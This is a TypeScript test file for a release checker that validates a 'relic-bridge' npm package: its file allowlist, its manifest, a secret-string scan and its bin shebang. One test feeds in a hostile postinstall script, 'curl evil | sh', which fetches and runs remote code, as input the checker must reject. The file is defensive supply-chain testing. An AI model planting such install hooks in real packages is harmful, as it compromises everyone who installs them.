// SPDX-License-Identifier: Apache-2.0
import { describe, expect, it } from 'vitest';
import { checkBin, checkFileList, checkManifest, EXPECTED_FILES, scanContent } from '../check-package.ts';

const goodManifest = {
  name: 'relic-bridge',
  version: '0.1.0',
  license: 'Apache-2.0',
  bin: { 'relic-bridge': './dist/index.mjs' },
  scripts: { build: 'tsdown' },
  dependencies: { zod: '4.6.5' },
};

describe('checkFileList', () => {
  it('accepts exactly the allowlist', () => {
    expect(checkFileList([...EXPECTED_FILES].reverse())).toEqual([]);
  });

  it('flags extra and missing files', () => {
    const errors = checkFileList([
      'dist/index.mjs',
      'package.json',
      'LICENSE',
      'README.md',
      'test/a.test.ts',
    ]);
    expect(errors).toContain('unexpected file in tarball: test/a.test.ts');
    expect(errors).toContain('missing file in tarball: NOTICE');
  });
});

describe('checkManifest', () => {
  it('accepts the published manifest shape', () => {
    expect(checkManifest(goodManifest)).toEqual([]);
  });

  it('rejects install scripts, workspace ranges, internal deps and a wrong bin', () => {
    const errors = checkManifest({
      ...goodManifest,
      bin: { 'relic-bridge': './src/index.ts' },
      scripts: { postinstall: 'curl evil | sh' },
      dependencies: {
        '@relic-bridge/core': 'workspace:*',
        x: 'git+https://example.com/x.git',
        y: 'file:../y',
      },
    });
    expect(errors.some((e) => e.startsWith('bin must be'))).toBe(true);
    expect(errors).toContain('install-time script "postinstall" is not allowed');
    expect(errors.filter((e) => e.includes('non-registry range'))).toHaveLength(2);
    expect(errors.some((e) => e.includes('internal packages are bundled'))).toBe(true);
  });

  it('rejects a private package, wrong name or license', () => {
    expect(checkManifest({ ...goodManifest, private: true, name: 'x', license: 'MIT' })).toHaveLength(3);
  });
});

describe('scanContent', () => {
  it('passes code that only mentions key prefixes', () => {
    expect(
      scanContent('dist/index.mjs', 'const re = /\\b(NRAK|NRAA)-[A-Za-z0-9_-]{8,}/g; "rb_" + x'),
    ).toEqual([]);
  });

  it('flags secret-shaped strings and local paths', () => {
    const key = `NRAK-${'A'.repeat(27)}`;
    expect(scanContent('a', `const k = "${key}"`)).toEqual(['a: contains a New Relic key-shaped string']);
    expect(scanContent('a', `x rb_live_${'b'.repeat(20)}`)).toEqual([
      'a: contains a relic-bridge token-shaped string',
    ]);
    expect(scanContent('a', `-----BEGIN RSA PRIVATE KEY-----`)).toEqual([
      'a: contains a private key-shaped string',
    ]);
    expect(scanContent('a', '//# sourceMappingURL=/home/dev/repo/x.map')).toEqual([
      'a: contains an absolute local path',
    ]);
  });
});

describe('checkBin', () => {
  it('needs a node shebang and the executable bit', () => {
    expect(checkBin('#!/usr/bin/env node\nimport x', 0o755)).toEqual([]);
    expect(checkBin('import x', 0o644)).toHaveLength(2);
  });
});
